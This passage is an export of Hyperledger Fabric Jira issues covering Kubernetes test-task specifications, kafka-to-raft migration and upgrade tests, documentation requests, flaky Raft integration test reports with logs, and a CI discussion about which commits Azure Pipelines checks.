Based on our discussion, this is somewhat complicated by how gossip has been wired into the code.;;;","17/Jan/20 3:04 AM;wlahti;master: [https://github.com/hyperledger/fabric/pull/507];;;","17/Jan/20 11:06 PM;sykesm;[~wlahti] can we get this cherry-picked back to release-1.4 please?

Thanks.;;;","17/Jan/20 11:13 PM;wlahti;Working on it. :) It isn't a straightforward, one-to-one cherry-pick. ;;;","21/Jan/20 2:33 AM;wlahti;release-1.4: [https://github.com/hyperledger/fabric/pull/512];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: traffic in k8s with State-based endorsement (SBE),FAB-17328,43876,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 4:57 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:28 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,,,,,"This is a test scenario using fabric-test Operator + PTE:
 * sbecc_go_2chan_endorse (refer to FAB-11615, and refer to file fabric-test/tools/operator/scripts/operator.sh and function sbecc_go_2chan_endorse)
 * This exists in current k8s automation suite in kafka network; *ADD it to raft network* (since it is the only current test requiring 2 endorsements, and so it will still be around when we delete kafka tests in 2.x timefame).
 * Use Operator to launch a small network (minimum 3 orderers, 2 orgs and 2 peers per org), preferably in k8s cluster
 * Configure using either kafka or raft, couchdb, 2 channels, 2 thrds, sbe golang chaincode
 * Use PTE to execute invokes, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-11615,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfp:8",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: k8s migration kafka to raft,FAB-17329,43877,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,scottz,scottz,09/Jan/20 5:24 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:29 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,,,,,"This is a test scenario using fabric-test Operator + PTE and bash script for administrator functions:
 * kafka-to-raft_migration.  Refer to fabric-test/regression/systemtest/sysTestSuite_pte.py function test_09raftMigration , or the new version of this test found at fabric-test/[tools/operator/networkclient/migrateToRaft.go|https://github.com/hyperledger/fabric-test/pull/22/files#diff-1e8ce4bacb577f0e866273e012c3146d] function MigrateToRaft. (For more background, refer to FAB-16259 and FAB-15760, or readthedocs.)

 * Use Operator to launch a small network (minimum 3 orderers, 2 orgs and 2 peers per org), preferably in k8s cluster.
 * Configure using kafka, couchdb, multiple channels.
 * Use PTE to execute invokes and queries.
 * Following the proper documented steps for migration, for each channel: submit transaction to take the channel to maintenance mode, change the orderertype to raft, restart the orderers, and submit config TX to change mode to normal again.
 * Note: any transactions submitted by clients while the channel is in Maintenance Mode should be rejected with 503-ServiceUnavailable.
 * Use PTE to execute new invokes and queries, and confirm all new transactions are successful. There should be no panics and no error logs observed.

 ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10085,,,Automated,,Unset,No,,,"1|hzwqfp:a",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic in k8s with raft, couchdb, 2 channels, samplecc golang chaincode",FAB-17330,43878,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,scottz,scottz,09/Jan/20 5:39 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:29 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,,,,,"This is a test scenario using fabric-test Operator + PTE, in k8s cluster:
 * k8s samplecc_2chan (refer to existing test in automation suite)
 * Use Operator to launch a small network (minimum 3 orderers, 2 orgs and 2 peers per org), preferably in k8s cluster
 * Configure using raft, couchdb, 2 channels, multiple thrds, samplecc golang chaincode
 * Use PTE to execute invokes, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.

 ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfp:c",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic in k8s with raft, couchdb, 2 channels, samplejs nodejs chaincode",FAB-17331,43879,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 5:40 AM,22/Jan/20 1:34 AM,28/Oct/23 3:09 AM,22/Jan/20 1:34 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,,,,,"This is a test scenario using fabric-test Operator + PTE, in k8s cluster:
 * k8s samplejs_2chan (refer to existing test in automation suite; CONSIDER enhancing with 2 required endorsements)
 * Use Operator to launch a small network (minimum 3 orderers, 2 orgs and 2 peers per org), preferably in k8s cluster
 * Configure using raft, couchdb, 2 channels, multiple thrds, samplejs nodejs chaincode
 * Use PTE to execute invokes, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.

 ",,denyeart,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqrk:5iwr4rb0x",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),denyeart,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jan/20 11:44 PM;denyeart;How is this different from FAB-17332 ?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic in k8s with raft, couchdb, 2 channels, samplejava java chaincode",FAB-17332,43880,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,09/Jan/20 5:41 AM,11/Jan/21 2:31 AM,28/Oct/23 3:09 AM,11/Jan/21 2:31 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,,,,,"This is a test scenario using fabric-test Operator + PTE, in k8s cluster:
 * k8s samplejava_2chan (add java cc test to existing automation suite)
 * Use Operator to launch a small network (minimum 3 orderers, 2 orgs and 2 peers per org), preferably in k8s cluster
 * Configure using raft, couchdb, 2 channels, multiple thrds, samplejava java chaincode
 * Use PTE to execute invokes, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,FAB-17437,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb13002",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic in k8s with raft, couchdb, large 8 MB transactions",FAB-17333,43881,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 5:50 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:28 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,,,,,"This is a test scenario using fabric-test Operator + PTE, in k8s cluster:
 * k8s samplecc_8MB_TXs
 * Use Operator to launch a small network (minimum 3 orderers, 2 orgs and 2 peers per org), preferably in k8s cluster
 * Configure using raft, couchdb, 1 channel, samplecc golang cc
 * Use PTE to execute invokes with 4 MB payloads (resulting in 8 MB sized transactions). Calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfp:e",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic in k8s with raft, couchdb, huge 50 MB transactions",FAB-17334,43882,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 5:52 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:28 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,,,,,"This is a test scenario using fabric-test Operator + PTE, in k8s cluster:
 * k8s samplecc_50MB_TXs; refer to existing testcase in k8s automation suite
 * Use Operator to launch a small network (minimum 3 orderers, 2 orgs and 2 peers per org), preferably in k8s cluster
 * Configure using raft, couchdb, 1 channel, samplecc golang cc
 * Use PTE to execute a few invokes with 25 MB payloads (resulting in 50 MB sized transactions). Calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfp:g",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add more details about channel MSPs and organizations in update a channel,FAB-17335,43883,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,pandrejko,pandrejko,09/Jan/20 6:10 AM,09/Jan/20 6:37 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"In [here|https://github.com/hyperledger/fabric/pull/307#discussion_r360013151] Nik has requested that we add more information about channel MSPs and organization definitions in the updating a channel doc: [https://hyperledger-fabric.readthedocs.io/en/release-1.4/config_update.html|https://hyperledger-fabric.readthedocs.io/en/master/config_update.html]]

 ",,joe-alewine,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65jji",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),joe-alewine,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jan/20 6:24 AM;joe-alewine;I did include some information in this doc about adding orgs, but as it's a topic about editing channels and only briefly goes into detail about the the kinds of things that can be edited I didn't add more about channel MSPs or org definitions (deeper dives into that information are better left to other docs, imo).

That being said, these are such important parts of a channel config it might make sense to include more info about them specifically, even if this information might eventually make its way to a more dedicate topic on those things.;;;","09/Jan/20 6:37 AM;pandrejko;Also see FAB-11762;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent Raft UT failure - removes leader from replica set [It],FAB-17336,43884,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,guoger,guoger,guoger,09/Jan/20 3:43 PM,24/Mar/20 11:12 PM,28/Oct/23 3:09 AM,24/Mar/20 11:12 PM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=4849&view=logs&j=a11cdf60-0d11-5130-c801-1b4953009464&t=849b73ad-cbaa-5065-7214-c0ac3d42920d&l=4530,,denyeart,guoger,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017aj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,guoger,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jan/20 2:06 AM;denyeart;[~guoger] Please use label `ci-flake` rather than `ci-flakes`. I'll see if we can remove the latter label.;;;","24/Mar/20 11:12 PM;sykesm;No logs and no details means no action.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Last line of chaincode output is not always captured when attach logs is true,FAB-17337,43892,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,sykesm,sykesm,sykesm,09/Jan/20 11:24 PM,10/Jan/20 12:25 AM,28/Oct/23 3:09 AM,10/Jan/20 12:25 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"The log streaming implementation would not forward log lines that did not end in a new line. While this is mostly okay, there are a handful of times when the last line is not flushed before the stream is closed and we want to make sure we grab those.",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017cb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"09/Jan/20 11:31 PM;sykesm;https://github.com/hyperledger/fabric/pull/477;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Checks targets should check all commits,FAB-17338,43893,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,btl5037,btl5037,btl5037,10/Jan/20 12:23 AM,26/Mar/20 10:29 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-build,,,,,,,,,0,,,,,,In AZP we check only the most recent commit when performing checks in the VerifyBuild step. We need to modify to check all commits in a PR,,btl5037,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017cj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Mar/20 1:02 AM;sykesm;I took a look at the command AZP uses to checkout the pull request and it appears to go after the merge commit. As long as that works, it should be testing all of the changes from the base branch.

{code}
git -c http.extraheader=""AUTHORIZATION: basic ***"" fetch --force --tags --prune --progress --no-recurse-submodules origin +refs/heads/*:refs/remotes/origin/* +refs/pull/912/merge:refs/remotes/pull/912/merge
remote: Enumerating objects: 17, done.
{code}

That said, drone-CI had a number of issues using that ref on GitHub and would occasionally get the wrong commit [1]. GitHub said that they don't document the merge ref and that it's not supported. No idea if that's still true or if that story would hold now that AZP and GitHub are the same company.

[1]: https://discourse.drone.io/t/github-claims-that-merge-refs-are-undocumented-feature/1100;;;","26/Mar/20 10:27 PM;btl5037;Obviously I can't confirm it at the moment, but I bet this is actually occurring. A couple months ago [~caod] pointed out that AZP checked out the wrong commit when it did its tests (which were successful), but the actual code had a bug in it and he had to submit a second PR to fix it. We were never able to replicate it so we wrote it off as a flake.

A few times the doc team has noted that their PR's, which only contain doc related changes, have triggered tests.

And on several occasions we've seen builds that have no business triggering Gossip, actually trigger Gossip unit tests (on time a single change to the README triggered them).

This would explain a lot of the strange behavior we thought we were seeing.;;;","26/Mar/20 10:29 PM;btl5037;We should be diligent to watch for it, and if we can get an instance of it occurring I can reach out the AZP team with documented proof.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Refactor couchdb unit test - only start couchdb container once,FAB-17339,43911,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,dereckluo,dereckluo,10/Jan/20 12:53 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,16/Jan/20 5:36 AM,,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"Refactoring couchdb unit test in core/ledger.
- For each package contains unit tests that use couchdb, only start couchdb container once for all tests, and cleanup after all tests finished.
- Packages *statecouchdb* and *couchdb* are using package level global variables to store couchdb address. Extract this out to a single util package, might be cleaner.",,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqfp:i",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Jan/20 3:26 AM;dereckluo;https://github.com/hyperledger/fabric/pull/482
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode label regexp is incomplete and test is woefully inadequate,FAB-17340,43913,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,sykesm,sykesm,10/Jan/20 1:10 AM,10/Jan/20 3:19 AM,28/Oct/23 3:09 AM,10/Jan/20 3:19 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,,,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017gz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Jan/20 1:15 AM;sykesm;https://github.com/hyperledger/fabric/pull/480;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: Upgrade fabric version to 2.0, using kafka and leveldb",FAB-17341,43915,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 1:28 AM,11/Jan/21 2:31 AM,28/Oct/23 3:09 AM,11/Jan/21 2:31 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,Launch a network using kafka and leveldb with fabric version 1.4.4 (or 1.4.5-stable) and follow all upgrade steps in FAB-16986 to upgrade the network to v2.0.0 (or v2.0.0-beta).,,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16986,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10085,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb1301",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: Upgrade fabric version to 2.0, using raft and couchdb",FAB-17342,43919,,Test Task,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,scottz,scottz,10/Jan/20 1:34 AM,11/Jan/21 2:30 AM,28/Oct/23 3:09 AM,11/Jan/21 2:30 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,Launch a network using raft and couchdb with fabric version 1.4.4 (or 1.4.5-stable) and follow all steps in FAB-16986 to upgrade the network to v2.0.0 (or v2.0.0-beta).,,baohua,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16986,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10085,,,Manual,,Unset,No,,,"1|hzwqrk:5iwr4rb13004",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),baohua,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent IT failure in raft: EndToEnd reconfiguration and onboarding when a single node cluster is expanded [It] is still possible to onboard the new cluster member and then another one with a different TLS root CA ,FAB-17343,43920,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Highest,,,sykesm,sykesm,10/Jan/20 1:46 AM,07/Apr/20 5:58 AM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"This was encountered during an integration test run against a PR:

{code}
2020-01-09T14:56:38.7720372Z ------------------------------
2020-01-09T14:56:38.7720596Z â€¢ Failure [84.520 seconds]
2020-01-09T14:56:38.7720942Z EndToEnd reconfiguration and onboarding when a single node cluster is expanded [It] is still possible to onboard the new cluster member and then another one with a different TLS root CA 
2020-01-09T14:56:38.7721215Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/raft/config_test.go:242
2020-01-09T14:56:38.7745324Z 
2020-01-09T14:56:38.7745754Z   Timed out after 60.001s
{code}

Log snippet:
{code}
2020-01-09T14:56:38.7408591Z STEP: Adding the third orderer to the channel
2020-01-09T14:56:38.7409186Z [d][peer-channel-fetch] starting peer channel fetch config --channelID systemchannel --orderer 127.0.0.1:25000 /tmp/e2e-etcfraft_reconfig730607004/getConfigBlock173755076/config_block.pb --tls --cafile /tmp/e2e-etcfraft_reconfig730607004/crypto/ca-certs.pem
2020-01-09T14:56:38.7409513Z [e][peer-channel-fetch] 2020-01-09 14:55:36.681 UTC [channelCmd] InitCmdFactory -> INFO 001 Endorser and orderer connections initialized
2020-01-09T14:56:38.7409825Z [e][peer-channel-fetch] 2020-01-09 14:55:36.683 UTC [cli.common] readBlock -> INFO 002 Received block: 1
2020-01-09T14:56:38.7410136Z [e][peer-channel-fetch] 2020-01-09 14:55:36.683 UTC [channelCmd] fetch -> INFO 003 Retrieving last config block: 1
2020-01-09T14:56:38.7410435Z [e][peer-channel-fetch] 2020-01-09 14:55:36.683 UTC [cli.common] readBlock -> INFO 004 Received block: 1
2020-01-09T14:56:38.7411147Z [e][OrdererOrg.orderer] 2020-01-09 14:55:36.685 UTC [common.deliver] Handle -> WARN 068 Error reading from 127.0.0.1:40750: rpc error: code = Canceled desc = context canceled
2020-01-09T14:56:38.7411617Z [e][OrdererOrg.orderer] 2020-01-09 14:55:36.685 UTC [comm.grpc.server] 1 -> INFO 069 streaming call completed grpc.service=orderer.AtomicBroadcast grpc.method=Deliver grpc.peer_address=127.0.0.1:40750 error=""rpc error: code = Canceled desc = context canceled"" grpc.code=Canceled grpc.call_duration=3.430067ms
2020-01-09T14:56:38.7412066Z [d][peer-channel-fetch] starting peer channel fetch config --channelID systemchannel --orderer 127.0.0.1:25000 /tmp/e2e-etcfraft_reconfig730607004/currentConfigBlock813864598/config_block.pb --tls --cafile /tmp/e2e-etcfraft_reconfig730607004/crypto/ca-certs.pem
2020-01-09T14:56:38.7412509Z [e][peer-channel-fetch] 2020-01-09 14:55:36.729 UTC [channelCmd] InitCmdFactory -> INFO 001 Endorser and orderer connections initialized
2020-01-09T14:56:38.7412807Z [e][peer-channel-fetch] 2020-01-09 14:55:36.732 UTC [cli.common] readBlock -> INFO 002 Received block: 1
2020-01-09T14:56:38.7413103Z [e][peer-channel-fetch] 2020-01-09 14:55:36.732 UTC [channelCmd] fetch -> INFO 003 Retrieving last config block: 1
2020-01-09T14:56:38.7413415Z [e][peer-channel-fetch] 2020-01-09 14:55:36.734 UTC [cli.common] readBlock -> INFO 004 Received block: 1
2020-01-09T14:56:38.7413763Z [e][OrdererOrg.orderer] 2020-01-09 14:55:36.735 UTC [common.deliver] Handle -> WARN 06a Error reading from 127.0.0.1:40752: rpc error: code = Canceled desc = context canceled
2020-01-09T14:56:38.7414352Z [e][OrdererOrg.orderer] 2020-01-09 14:55:36.736 UTC [comm.grpc.server] 1 -> INFO 06b streaming call completed grpc.service=orderer.AtomicBroadcast grpc.method=Deliver grpc.peer_address=127.0.0.1:40752 error=""rpc error: code = Canceled desc = context canceled"" grpc.code=Canceled grpc.call_duration=5.814145ms
2020-01-09T14:56:38.7414678Z [d][peer-channel-signconfigtx] starting peer channel signconfigtx --file /tmp/e2e-etcfraft_reconfig730607004/updateConfig879037779/update.pb
2020-01-09T14:56:38.7415201Z [e][peer-channel-signconfigtx] 2020-01-09 14:55:36.779 UTC [channelCmd] InitCmdFactory -> INFO 001 Endorser and orderer connections initialized
2020-01-09T14:56:38.7415814Z [d][peer-channel-update] starting peer channel update --channelID systemchannel --orderer 127.0.0.1:25000 --file /tmp/e2e-etcfraft_reconfig730607004/updateConfig879037779/update.pb --tls --cafile /tmp/e2e-etcfraft_reconfig730607004/crypto/ca-certs.pem
2020-01-09T14:56:38.7416198Z [e][peer-channel-update] 2020-01-09 14:55:36.818 UTC [channelCmd] InitCmdFactory -> INFO 001 Endorser and orderer connections initialized
